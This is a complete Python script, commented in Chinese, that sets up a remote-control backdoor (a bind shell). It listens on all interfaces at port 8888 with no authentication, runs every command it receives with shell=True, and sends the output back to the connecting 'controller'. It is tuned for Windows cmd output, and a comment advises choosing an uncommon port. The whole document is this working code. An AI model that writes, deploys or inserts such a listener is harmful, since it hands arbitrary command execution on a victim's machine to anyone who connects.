import socket
import subprocess

# 1. 设置被控端的IP和端口
HOST = '0.0.0.0'  # 0.0.0.0 表示监听所有网卡，允许局域网内其他电脑连接
PORT = 8888  # 换一个不常用的端口

# 2. 建立 TCP 服务端
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)  # 允许1个连接排队
print(f"被控端已启动，正在监听端口 {PORT}... 等待连接")

# 3. 接受连接
conn, addr = server.accept()
print(f"控制端 {addr} 已连接！")

while True:
    try:
        # 接收控制端发来的命令
        command = conn.recv(1024).decode('utf-8')
        if not command or command.lower() == 'exit':
            break

        print(f"收到命令: {command}")

        # 执行命令 (使用 subprocess 获取结果)
        # shell=True 允许运行 cmd 命令，stdout 捕获标准输出，stderr 捕获报错
        result = subprocess.run(command, shell=True, capture_output=True)

        # 组合正常输出和错误输出，并处理编码问题（Windows cmd 默认是 GBK）
        output = result.stdout + result.stderr
        output_str = output.decode('gbk', errors='ignore')

        # 如果没有输出，给个提示
        if not output_str:
            output_str = "[命令执行成功，无输出内容]"

        # 把结果发回给控制端
        conn.send(output_str.encode('utf-8'))

    except Exception as e:
        print(f"发生错误: {e}")
        break

conn.close()
server.close()